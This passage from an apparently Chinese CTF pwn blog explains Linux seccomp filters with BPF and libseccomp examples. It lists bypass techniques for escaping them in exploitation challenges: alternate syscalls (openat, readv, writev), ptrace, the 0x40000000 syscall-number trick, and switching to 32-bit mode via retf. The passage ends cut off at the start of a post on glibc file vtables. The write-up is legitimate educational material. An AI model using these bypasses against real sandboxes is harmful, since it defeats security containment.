class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sandbox</span><span class="params">()</span>&#123;    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">    BPF_STMT(BPF_LD+BPF_W+BPF_ABS,<span class="number">4</span>),</span><br><span class="line">    BPF_JUMP(BPF_JMP+BPF_JEQ,<span class="number">0xc000003e</span>,<span class="number">0</span>,<span class="number">2</span>),<span class="comment">//0xc000003e为ARCH_X86_64</span></span><br><span class="line">    BPF_STMT(BPF_LD+BPF_W+BPF_ABS,<span class="number">0</span>),</span><br><span class="line">    BPF_JUMP(BPF_JMP+BPF_JEQ,<span class="number">59</span>,<span class="number">0</span>,<span class="number">1</span>),</span><br><span class="line">    BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL),</span><br><span class="line">    BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> =</span> &#123;</span><br><span class="line">    .len = (<span class="type">unsigned</span> <span class="type">short</span>)(<span class="keyword">sizeof</span>(filter)/<span class="keyword">sizeof</span>(filter[<span class="number">0</span>])),</span><br><span class="line">    .filter = filter,</span><br><span class="line">    &#125;;</span><br><span class="line">    prctl(PR_SET_NO_NEW_PRIVS,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;prog);&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    sandbox();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;start!n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>设置沙盒会使用到xmm寄存器,因此一些时候在程序内看到一连串看不懂的xmm寄存器相关操作,大抵是为接下来的沙盒工作</p><h2 id="seccomp函数实现"><a href="#seccomp函数实现" class="headerlink" title="seccomp函数实现"></a>seccomp函数实现</h2><p>seccomp_init对结构体进行初始化，若参数为SCMP_ACT_ALLOW，则过滤为黑名单模式；若为SCMP_ACT_KILL，则为白名单模式，即没有匹配到规则的系统调用都会杀死进程，默认不允许所有的syscall。</p><p>seccomp_rule_add用来添加一条规则，arg_cnt为0,表示我们直接限制execve,不管参数是什么，如果arg_cnt不为0,那arg_cnt表示后面限制的参数的个数,也就是只有调用execve,且参数满足要求时,才会拦截</p><p>seccomp_load是应用过滤器,如果不调用seccomp_load则上面所有的过滤都不会生效</p><p>注意：编译的时候要在最后面加 -lseccomp</p><p>一个例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">sandbox</span><span class="params">()</span>&#123;</span><br><span class="line">scmp_filter_ctx ctx;</span><br><span class="line">    ctx = seccomp_init(SCMP_ACT_ALLOW);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    seccomp_load(ctx);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    sandbox();</span><br><span class="line">    <span class="type">char</span> * str = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">    write(<span class="number">1</span>,<span class="string">&quot;hello worldn&quot;</span>,<span class="number">12</span>);</span><br><span class="line">    syscall(<span class="number">59</span>,str,<span class="literal">NULL</span>,<span class="literal">NULL</span>);<span class="comment">//execve</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>seccomp_init 返回的是一个 scmp_filter_ctx 的结构体</p><p>有效的 def_action 有下面几种</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SCMP_ACT_KILL</span><br><span class="line">SCMP_ACT_KILL_PROCESS</span><br><span class="line">SCMP_ACT_TRAP</span><br><span class="line">SCMP_ACT_ERRNO</span><br><span class="line">SCMP_ACT_TRACE</span><br><span class="line">SCMP_ACT_LOG</span><br><span class="line">SCMP_ACT_ALLOW</span><br></pre></td></tr></table></figure><p>其中<code>SCMP_ACT_KILL</code> 和 <code>SCMP_ACT_ALLOW</code>，一个是白名单，一个是黑名单</p><p><code>seccomp_rule_add</code>可以添加规则</p><p><code>int seccomp_rule_add(scmp_filter_ctx ctx, uint32_t action,int syscall, unsigned int arg_cnt, ...);</code></p><p>arg_cnt 这个是指后面跟随的参数的个数，比如</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rc = seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), <span class="number">3</span>,</span><br><span class="line">                      SCMP_A0(SCMP_CMP_EQ, fd),</span><br><span class="line">                      SCMP_A1(SCMP_CMP_EQ, (<span class="type">scmp_datum_t</span>)buf),</span><br><span class="line">                      SCMP_A2(SCMP_CMP_LE, BUF_SIZE));</span><br><span class="line">rc = seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), <span class="number">1</span>,</span><br><span class="line">                      SCMP_CMP(<span class="number">0</span>, SCMP_CMP_EQ, fd));</span><br><span class="line">rc = seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>分别是 3 ，1，0 个。然后后面的参数就是 comparison op,主要有下面几种</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">SCMP_CMP_NE</span><br><span class="line">Matches <span class="keyword">when</span> the argument value <span class="built_in">is</span> <span class="built_in">not</span> equal <span class="keyword">to</span> the datum value, example:</span><br><span class="line"></span><br><span class="line">SCMP_CMP( arg , SCMP_CMP_NE , datum )</span><br><span class="line"></span><br><span class="line">SCMP_CMP_LT</span><br><span class="line">Matches <span class="keyword">when</span> the argument value <span class="built_in">is</span> less than the datum value, example:</span><br><span class="line"></span><br><span class="line">SCMP_CMP( arg , SCMP_CMP_LT , datum )</span><br><span class="line"></span><br><span class="line">SCMP_CMP_LE</span><br><span class="line">Matches <span class="keyword">when</span> the argument value <span class="built_in">is</span> less than <span class="built_in">or</span> equal <span class="keyword">to</span> the datum value, example:</span><br><span class="line"></span><br><span class="line">SCMP_CMP( arg , SCMP_CMP_LE , datum )</span><br><span class="line"></span><br><span class="line">SCMP_CMP_EQ</span><br><span class="line">Matches <span class="keyword">when</span> the argument value <span class="built_in">is</span> equal <span class="keyword">to</span> the datum value, example:</span><br><span class="line"></span><br><span class="line">SCMP_CMP( arg , SCMP_CMP_EQ , datum )</span><br><span class="line"></span><br><span class="line">SCMP_CMP_GE</span><br><span class="line">Matches <span class="keyword">when</span> the argument value <span class="built_in">is</span> greater than <span class="built_in">or</span> equal <span class="keyword">to</span> the datum value, example:</span><br><span class="line"></span><br><span class="line">SCMP_CMP( arg , SCMP_CMP_GE , datum )</span><br><span class="line"></span><br><span class="line">SCMP_CMP_GT</span><br><span class="line">Matches <span class="keyword">when</span> the argument value <span class="built_in">is</span> greater than the datum value, example:</span><br><span class="line"></span><br><span class="line">SCMP_CMP( arg , SCMP_CMP_GT , datum )</span><br><span class="line"></span><br><span class="line">SCMP_CMP_MASKED_EQ</span><br><span class="line">Matches <span class="keyword">when</span> the masked argument value <span class="built_in">is</span> equal <span class="keyword">to</span> the masked datum value, example:</span><br><span class="line"></span><br><span class="line">SCMP_CMP( arg , SCMP_CMP_MASKED_EQ , mask , datum )</span><br></pre></td></tr></table></figure><p>seccomp_load 其实就是应用 filter</p><h2 id="CTF中常见的seccomp及绕过"><a href="#CTF中常见的seccomp及绕过" class="headerlink" title="CTF中常见的seccomp及绕过"></a>CTF中常见的seccomp及绕过</h2><h3 id="1—禁用execve"><a href="#1—禁用execve" class="headerlink" title="1—禁用execve"></a>1—禁用execve</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">0000:</span> <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  <span class="string">A</span> <span class="string">=</span> <span class="string">arch</span></span><br><span class="line"><span class="attr">0001:</span> <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x04</span> <span class="number">0xc000003e</span>  <span class="string">if</span> <span class="string">(A</span> <span class="type">!=</span> <span class="string">ARCH_X86_64)</span> <span class="string">goto</span> <span class="number">0006</span></span><br><span class="line"><span class="attr">0002:</span> <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="string">A</span> <span class="string">=</span> <span class="string">sys_number</span></span><br><span class="line"><span class="attr">0003:</span> <span class="number">0x35</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x40000000</span>  <span class="string">if</span> <span class="string">(A</span> <span class="string">&gt;=</span> <span class="number">0x40000000</span><span class="string">)</span> <span class="string">goto</span> <span class="number">0006</span></span><br><span class="line"><span class="attr">0004:</span> <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="string">if</span> <span class="string">(A</span> <span class="string">==</span> <span class="string">execve)</span> <span class="string">goto</span> <span class="number">0006</span></span><br><span class="line"><span class="attr">0005:</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="string">return</span> <span class="string">ALLOW</span></span><br><span class="line"><span class="attr">0006:</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="string">return</span> <span class="string">KILL</span></span><br></pre></td></tr></table></figure><p>这种可以通过 open read write 来读取flag</p><h3 id="2—禁用execve-open-write-read"><a href="#2—禁用execve-open-write-read" class="headerlink" title="2—禁用execve,open,write,read"></a>2—禁用execve,open,write,read</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x09</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x06</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A == write) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A == open) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000003</span>  <span class="keyword">if</span> (A == close) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0010</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"><span class="number">0011</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure><p>open系统调用实际上是调用了openat，所以直接 调用openat，然后除了 read，write，其实还有两个</p><p>readv，和writev，这些就能绕过限制读取flag,有些连openat都禁用的可以 ptrace 修改syscall</p><h3 id="3—禁用execve-控制open-write-read的参数"><a href="#3—禁用execve-控制open-write-read的参数" class="headerlink" title="3—禁用execve,控制open,write,read的参数"></a>3—禁用execve,控制open,write,read的参数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0b</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0013</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x08</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0013</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A == open) <span class="keyword">goto</span> <span class="number">0012</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x06</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A != read) <span class="keyword">goto</span> <span class="number">0013</span></span><br><span class="line"><span class="number">0007</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000014</span>  A = fd &gt;&gt; <span class="number">32</span> <span class="meta"># read(fd, buf, count)</span></span><br><span class="line"><span class="number">0008</span>: <span class="number">0x25</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A &gt; <span class="number">0x0</span>) <span class="keyword">goto</span> <span class="number">0012</span></span><br><span class="line"><span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x03</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A != <span class="number">0x0</span>) <span class="keyword">goto</span> <span class="number">0013</span></span><br><span class="line"><span class="number">0010</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000010</span>  A = fd <span class="meta"># read(fd, buf, count)</span></span><br><span class="line"><span class="number">0011</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x00000004</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x4</span>) <span class="keyword">goto</span> <span class="number">0013</span></span><br><span class="line"><span class="number">0012</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"><span class="number">0013</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure><p>限制参数的,可以在参数上找关键点</p><h3 id="4—限制sys-number"><a href="#4—限制sys-number" class="headerlink" title="4—限制sys_number"></a>4—限制sys_number</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x07</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0003</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A == open) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A == mmap) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000065</span>  <span class="keyword">if</span> (A == ptrace) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000101</span>  <span class="keyword">if</span> (A == openat) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x00000130</span>  <span class="keyword">if</span> (A == open_by_handle_at) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0008</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"><span class="number">0009</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure><p>没有判断<code>if (A &lt; 0x40000000)</code></p><p>导致了可以 0x40000000+sys_number绕过，sys_number |= 0x40000000</p><p>同样如果没有判断<code>if(A != ARCH_X86_64)</code></p><p>这个可以同32位的shellcode绕过过</p><h2 id="通过切换模式来绕过PWN题中对系统调用的拦截"><a href="#通过切换模式来绕过PWN题中对系统调用的拦截" class="headerlink" title="通过切换模式来绕过PWN题中对系统调用的拦截"></a>通过切换模式来绕过PWN题中对系统调用的拦截</h2><p><strong>retf</strong>是一条远转移指令，等价于pop cs; pop ip，这条指令一般来说可以在libc中找到，但为什么它能修改程序的模式呢，实际上是因为它修改了cs段寄存器。</p><p><strong>cs寄存器</strong>即code segment寄存器，指向存放代码的内存段，在8086的实模式下，指令的寻址为cs:ip-&gt;cs *16 + ip。在32位保护模式下，cpu地址总线和通用寄存器都达到了32位，可以直接访问4GB的内存，段寄存器被赋予了新的任务：保存段描述符的索引即段选择符(segment descriptor)</p><pre><code>                +--------------------------------------+                |         index                 |T|    |                |                               |I|RPL |                +--------------------------------^--^--+                                                 |  |                   Table indicator+--------------+  |                     0 GDT                          |                     1 LDT                          |                  Request Privilege Level+----------+                    </code></pre><p>段选择符的低两位用来表示特权级0-3，第3位表示对应的描述符是位于GDT or LDT，高15位则是下标。在段描述符里，保存有更多的该段的参数信息，包括段基址、粒度、属性、模式等等，</p><p>以64为模式切换到32位模式为例，为了实现模式的切换，我们需要找到一个合适的段选择符，它指向GDT中的一个32位的段描述符。</p><p>在linux x86_x64中，<strong>0x23是一个32位的代码段选择符</strong>（位于GDT），<strong>0x33是一个64位长模式的代码段选择符</strong>。所以在模式切换时，只需用retf指令将cs寄存器的值由0x33改为0x23即可。</p><p>另外需要注意的是，由于程序从64位切换到了32位，<strong>所以各个通用寄存器的使用发生了变化，从原来的8字节变成了只使用低4字节</strong>，特别对于栈寄存器<strong>esp</strong>来说，它是rsp的低4字节，原先的rsp保存着可以被正常访问的栈地址，但这个地址的低4字节大概率为一个不可访问的地址，<strong>所以在执行retf之前，还需要进行栈迁移</strong>，只要通过rop控制rbp后进行两次连续的leave指令就可以实现。</p><p>在Linux中，除了FS、GS需要设置段基址用于访问TLS之外，其余的段寄存器对应的段描述符中的段基址都被置为了0，也就是直接使用偏移作为内存访问的绝对地址，所以只要控制好指令指针寄存器，模式切换时就不会出现控制流的失控。</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sandbox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>file虚表函数学习</title>
      <link href="/posts/1518/"/>
      <url>/posts/1518/</url>
      
        <content type="html"><![CDATA[<h1 id="引"><a href="#引" class="headerlink" title="引*"></a>引*</h1><p>glibc中有各种vtable,fileops,strops,wfileops等等</p><p>更多的的可以在glibc/libio/vtables.c查看,不同vtable中对应的函数实现也不同,不过都是为io服务,都与_IO_FILE有关</p><p>本文主要研究file虚表函数,其主要集中在fileops.c中</p><p>fileops.c文件开头这一段注释提供了不少信息</p><p>认真阅读能提供不少帮助</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* An fstream can be in at most one of put mode, get mode, or putback mode.</span></span><br><span class="line"><span class="comment">   Putback mode is a variant of get mode.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   In a filebuf, there is only one current position, instead of two</span></span><br><span class="line"><span class="comment">   separate get and put pointers.  In get mode, the current position</span></span><br><span class="line"><span class="comment">   is that of gptr(); in put mode that of pptr().</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The position in the buffer that corresponds to the position</span></span><br><span class="line"><span class="comment">   in external file system is normally _IO_read_end, except in putback</span></span><br><span class="line"><span class="comment">   mode, when it is _IO_save_end and also when the file is in append mode,</span></span><br><span class="line"><span class="comment">   since switching from read to write mode automatically sends the position in</span></span><br><span class="line"><span class="comment">   the external file system to the end of file.</span></span><br><span class="line"><span class="comment">   If the field _fb._offset is &gt;= 0, it gives the offset in</span></span><br><span class="line"><span class="comment">   the file as a whole corresponding to eGptr(). (?)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   PUT MODE:</span></span><br><span class="line"><span class="comment">   If a filebuf is in put mode, then all of _IO_read_ptr, _IO_read_end,</span></span><br><span class="line"><span class="comment">   and _IO_read_base are equal to each other.  These are usually equal</span></span><br><span class="line"><span class="comment">   to _IO_buf_base, though not necessarily if we have switched from</span></span><br><span class="line"><span class="comment">   get mode to put mode.  (The reason is to maintain the invariant</span></span><br><span class="line"><span class="comment">   that _IO_read_end corresponds to the external file position.)</span></span><br><span class="line"><span class="comment">   _IO_write_base is non-NULL and usually equal to _IO_buf_base.</span></span><br><span class="line"><span class="comment">   We also have _IO_write_end == _IO_buf_end, but only in fully buffered mode.</span></span><br><span class="line"><span class="comment">   The un-flushed character are those between _IO_write_base and _IO_write_ptr.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   GET MODE:</span></span><br><span class="line"><span class="comment">   If a filebuf is in get or putback mode, eback() != egptr().</span></span><br><span class="line"><span class="comment">   In get mode, the unread characters are between gptr() and egptr().</span></span><br><span class="line"><span class="comment">   The OS file position corresponds to that of egptr().</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   PUTBACK MODE:</span></span><br><span class="line"><span class="comment">   Putback mode is used to remember &quot;excess&quot; characters that have</span></span><br><span class="line"><span class="comment">   been sputbackc&#x27;d in a separate putback buffer.</span></span><br><span class="line"><span class="comment">   In putback mode, the get buffer points to the special putback buffer.</span></span><br><span class="line"><span class="comment">   The unread characters are the characters between gptr() and egptr()</span></span><br><span class="line"><span class="comment">   in the putback buffer, as well as the area between save_gptr()</span></span><br><span class="line"><span class="comment">   and save_egptr(), which point into the original reserve buffer.</span></span><br><span class="line"><span class="comment">   (The pointers save_gptr() and save_egptr() are the values</span></span><br><span class="line"><span class="comment">   of gptr() and egptr() at the time putback mode was entered.)</span></span><br><span class="line"><span class="comment">   The OS position corresponds to that of save_egptr().</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   LINE BUFFERED OUTPUT:</span></span><br><span class="line"><span class="comment">   During line 